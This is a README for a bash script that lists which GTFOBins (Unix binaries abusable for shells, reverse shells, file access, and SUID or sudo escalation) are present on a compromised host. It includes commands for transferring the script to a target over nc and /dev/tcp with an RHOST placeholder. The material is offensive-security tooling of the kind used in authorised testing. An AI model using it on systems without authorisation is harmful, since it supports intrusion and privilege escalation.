# Overview

A 7k bash script that enumerates which GTFOBins are available.

# Usage

## Full listing

Run without arguments for a full listing of each command available and the functions it provides:

```
./gtofbinsenum.sh
```

## Specific listing

Run with a single argument for a listing of commands available providing the specified function. I.e. one of the following:

```
./gtfobinsenum.sh bind-shell
./gtfobinsenum.sh capabilities
./gtfobinsenum.sh command
./gtfobinsenum.sh file-download
./gtfobinsenum.sh file-read
./gtfobinsenum.sh file-upload
./gtfobinsenum.sh file-write
./gtfobinsenum.sh library-load
./gtfobinsenum.sh limited-suid
./gtfobinsenum.sh non-interactive-bind-shell
./gtfobinsenum.sh non-interactive-reverse-shell
./gtfobinsenum.sh reverse-shell
./gtfobinsenum.sh shell
./gtfobinsenum.sh sudo
./gtfobinsenum.sh suid
```

# Example output

## Full listing

This listing is grep friendly:

```
./gtfobinsenum.sh | head -n 10
agetty              suid
apt-get             shell,sudo
apt                 shell,sudo
awk                 shell,non-interactive-reverse-shell,non-interactive-bind-shell,file-write,file-read,suid,sudo,limited-suid
base32              file-read,suid,sudo
base64              file-read,suid,sudo
basenc              file-read,suid,sudo
bash                shell,reverse-shell,file-upload,file-download,file-write,file-read,library-load,suid,sudo
cat                 file-read,suid,sudo
chmod               suid,sudo
```

## Specific listing

This listing provides convenience URLs to gtfobins.github.io:

```
$ ./gtfobinsenum.sh file-download
bash                https://gtfobins.github.io/gtfobins/bash/#file-download
tar                 https://gtfobins.github.io/gtfobins/tar/#file-download
```

# Initial download

If you want to use `gtfobinsenum.sh` before knowing which `file-download` functions are available, then you might be somewhat stuck.

Don't forget to `chmod +x gtfobinsenum.sh` before running it if you're putting it on disk.

## With bash

On your host:
```
nc -l -p 12345 < gtfobinsenum.sh
```

On the target host:
```
cat < /dev/tcp/RHOST/12345 > gtfobinsenum.sh &
```

## With curl

```
curl -LO https://raw.githubusercontent.com/fx2301/gtfobinsenum/main/gtfobinsenum.sh
```

## With wget

```
wget https://raw.githubusercontent.com/fx2301/gtfobinsenum/main/gtfobinsenum.sh
```

## With perl

At the time of writing, [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#file-download) didn't list perl as being able to `file-download`. Google "IO::Socket::INET" for a solution.

# Regenerating

If you need to regenerate the bash script:

1. Regenerate `gtfobins.json` by running the following JavaScript on https://gtfobins.github.io:
  ```javascript
  JSON.stringify(Array.from(document.querySelectorAll('.bin-name')).map((el) => { return {bin: el.innerText, functions: Array.from(el.parentNode.parentNode.querySelectorAll('.function-list li')).map((el) => el.innerText)}} ))
  ```
2. Run `python3 generate.py`

